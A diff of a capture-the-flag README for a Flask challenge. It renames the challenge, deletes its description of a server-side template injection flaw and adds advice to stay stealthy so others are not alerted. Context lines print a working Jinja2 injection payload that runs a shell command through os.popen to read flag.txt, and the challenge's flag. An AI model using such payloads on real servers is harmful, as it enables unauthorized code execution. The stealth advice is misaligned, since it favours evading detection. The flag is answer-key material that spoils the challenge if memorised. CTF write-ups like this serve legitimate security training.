@@ -1,9 +1,10 @@
-# CTF Challenge: Flask SSTI Exploitation
+# CTF Challenge: mola7ada
+
+
 
 ## Challenge Description
-Participants are provided with a Flask-based web application that allows users to create posts with a `Title`, `Theme`, and `Content`. The application is vulnerable to **Server-Side Template Injection (SSTI)**, which allows attackers to execute arbitrary code on the server.
 
-The goal of the challenge is to exploit the SSTI vulnerability to read the contents of a hidden file named `flag.txt` located on the server.
+While performing web penetration testing, it's crucial to remain stealthy and avoid drawing unnecessary attention. Remember, the challenge itself might be straightforward, but the real skill lies in how you uncover the vulnerabilities without alerting others. Always strive to be the one who finds the fruit while others remain unaware of its existence.  
 
 ---
 
@@ -68,6 +69,8 @@ Copy
 {{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat ./flag.txt').read()") }}
 Output: The contents of flag.txt.
 ```
+
+
 ## FLAG 
 
 CTF{khoya_7na_mzrobin_3tih_flag_a_rabi3a}
